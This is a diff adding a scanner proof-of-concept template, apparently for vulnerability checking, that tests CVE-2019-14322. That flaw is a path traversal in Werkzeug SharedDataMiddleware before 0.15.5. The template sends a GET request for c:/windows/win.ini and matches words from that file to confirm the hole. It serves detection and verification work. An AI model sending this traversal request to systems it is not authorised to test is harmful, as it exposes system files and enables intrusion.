@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "验证 Pallets Werkzeug SharedDataMiddleware 路径遍历漏洞，通过构造包含 Windows 驱动器格式路径的请求读取系统敏感文件"
+id = "POC-AVE-2019-0076"
+name = "Pallets Werkzeug <0.15.5 Local File Inclusion PoC"
+severity = "high"
+tags = ["ave-2019-0076"]
+vuln_id = [
+    "CVE-2019-14322",
+    "AVE-2019-0076",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/base_import/static/c:/windows/win.ini"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["bit app support"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["fonts"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["extensions"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
